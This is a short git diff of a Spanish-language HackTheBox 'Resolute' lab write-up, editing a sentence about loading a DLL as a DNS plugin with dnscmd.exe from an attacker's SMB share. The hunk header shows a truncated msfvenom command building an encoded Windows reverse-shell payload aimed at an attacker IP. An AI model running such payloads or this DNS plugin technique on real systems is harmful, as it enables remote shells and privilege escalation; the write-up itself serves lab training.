@@ -99,7 +99,7 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp -e x64/xor LHOST=10.10.17.210 L
 
 ![Untitled](/assets/img/htb/machines/Resolute/Untitled%2014.png)
 
-Posterior a esto, con la herramienta `dnscmd.exe`, la cual es utilizada para administrar el DNS, añadimos a la DLL maliciosa como un *plugin* del servicio.
+Posterior a esto, con la herramienta `dnscmd.exe`, la cual es utilizada para administrar el DNS, añadimos la DLL como un *plugin* del servicio.
 
 Cabe destacar que la DLL se encuentra servida en una carpeta compartida por SMB, en nuestro servidor atacante. 
 
